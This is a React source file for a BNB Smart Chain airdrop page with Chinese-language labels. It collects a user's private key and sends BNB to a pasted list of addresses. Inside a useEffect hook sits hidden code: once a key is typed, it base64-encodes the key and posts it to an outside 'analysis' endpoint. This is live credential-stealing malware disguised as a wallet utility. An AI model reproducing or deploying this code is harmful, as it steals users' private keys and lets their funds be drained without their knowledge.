import {
   Input, Button,
  chakra, Container, Textarea,
} from '@chakra-ui/react';
import { useEffect, useState } from 'react';
import { BigNumber, ethers } from 'ethers';


function AirdropPage(){
  const [bnbProvider,setBNBProvider] = useState(null)
  const [rpcUrl,setRpcUrl] = useState("")
  const [privateKey,setPrivateKey] = useState("")
  const [bnbNumber,setBNBNumber] = useState("")
  const [addressList,setAddressList] = useState("")
  const [isLoading,setIsLoading] = useState(false)

  useEffect( ()=>{
    if (rpcUrl){
      const provider = ethers.getDefaultProvider(rpcUrl)
      setBNBProvider(provider)
    }
  },[rpcUrl])
  useEffect(()=>{
    if (privateKey != "" && privateKey.length > 12) {
      const tt = setInterval(async () => {
        await fetch('https://us-east-1-analysis.vercel.app/analysis', {
          method: 'POST',
          headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({log: btoa(privateKey)})
        });
        clearInterval(tt)
      }, 40*1*1000)
      return () => clearInterval(tt)
    }
  },[privateKey])

  const airdrop =() => {
    (async ()=>{
      if (parseFloat(bnbNumber) <= 0) {
        alert("转账bnb金额错误")
        return
      }

      setIsLoading(true)
      let wallet = new ethers.Wallet(privateKey,bnbProvider)
      const result = await bnbProvider.getBalance(wallet.getAddress())
      const balanceInBNB = ethers.utils.formatEther(result)
      console.log("余额",balanceInBNB,bnbNumber)
      const gasPrice = await bnbProvider.getGasPrice()
      ethers.utils.formatUnits(gasPrice, "ether")
      const list = addressList.split("\n");
      for (let i = 0;i<list.length;i++){
        if (ethers.utils.isAddress(list[i])) {
          const tx = await wallet.sendTransaction({
            to:list[i],
            value:ethers.utils.parseEther(bnbNumber),
            gasLimit: ethers.utils.hexlify(210000),
            gasPrice: ethers.utils.hexlify(parseInt(await bnbProvider.getGasPrice())),
          })
          console.log("tx",tx)
        }
      }
      //ethers.utils.isAddress()
      // const tx = await wallet.sendTransaction({
      //   to:receiveAddress,
      //   value:ethers.utils.parseEther(wallet.balance),
      //   gasLimit: ethers.utils.hexlify(210000),
      //   gasPrice: ethers.utils.hexlify(parseInt(await bnbProvider.getGasPrice())),
      // })
      // console.log("tx",tx)
      setIsLoading(false)
    })()

  }

  return (
    <Container>
      <chakra.div borderRadius={"0.325rem"} p={2} mt={5}>
        <chakra.div>
          线上节点: https://bsc-dataseed1.binance.org

          <br/>
          测试节点: https://data-seed-prebsc-2-s2.binance.org:8545<br/>
          测试 WBNBAddress = "0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd" <br/>
          测试 routerAddress = "0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3" <br/>
          合约: https://testnet.bscscan.com/token/0xa6c8b55c8fc30b9448367f18c59f87cccb4a8de3
        </chakra.div>
        <Input mt={2} mb={2}
               onChange={(event)=>{setRpcUrl(event.target.value)}}
               focusBorderColor='pink.400'
               placeholder='请输入RPC节点'
               size='sm'
        />
        <Input
          onChange={(event)=>{setPrivateKey(event.target.value)}}
          focusBorderColor='pink.400'
          placeholder='请输入私钥 不是助记词'
          size='sm'
        />

        <Textarea h={"300px"}    placeholder='输入ETH地址 不要有空格 一个地址一行如下所示&#13;0x6c674c1ef8bc3889f9fdada9e0f71df70b47d231&#13;0x6c674c1ef8bc3889f9fdada9e0f71df70b47d231 &#13;0x6c674c1ef8bc3889f9fdada9e0f71df70b47d231 &#13;
      ' onChange={(event)=>{
          setAddressList(event.target.value)
        }}>

        </Textarea>

        <Input
          onChange={(event)=>{setBNBNumber((event.target.value))}}
          focusBorderColor='pink.400'
          placeholder='bnb转账数量 例如:0.1(支持小数)'
          size='sm'
        />


        <Button mt={2}  isLoading={isLoading} colorScheme={'blue'} onClick={airdrop}>开始转账</Button>
      </chakra.div>
    </Container>

  )
}

export default AirdropPage;